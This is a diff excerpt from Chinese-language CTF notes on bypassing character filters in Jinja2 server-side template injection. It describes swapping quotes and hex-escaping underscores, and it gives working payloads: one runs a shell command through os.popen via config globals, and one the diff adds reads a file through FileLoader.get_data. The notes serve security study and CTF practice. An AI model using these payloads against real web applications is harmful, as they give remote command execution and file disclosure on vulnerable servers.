@@ -180,7 +180,11 @@ _io.TextIOWrapper 可以文件读取，可能在122位。
 ```
 单引号'被过滤可以用双引号"代替；至于点.和下划线_被过滤可以采用16进制来表示，用[](类似数组下标)的方式选定。知道怎么过滤了那就照着以前payload修改就好了。
 ```
-payload：{{config["\x5f\x5fclass\x5f\x5f"]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["os"]["popen"]("whoami")["read"]()}}
+{{config["\x5f\x5fclass\x5f\x5f"]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["os"]["popen"]("whoami")["read"]()}}
+
+利用frozen_importlib_external.FileLoader类
+get_data方法直接读文件
+{{()["\x5F\x5Fclass\x5F\x5F"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[91]["get\x5Fdata"](0, "/proc/self/fd/3")}}
 ```
 SSTI绕过注入:<https://xz.aliyun.com/t/3679#toc-11>
 ctf详解:<https://www.cnblogs.com/Article-kelp/p/14797393.html#questionOne>
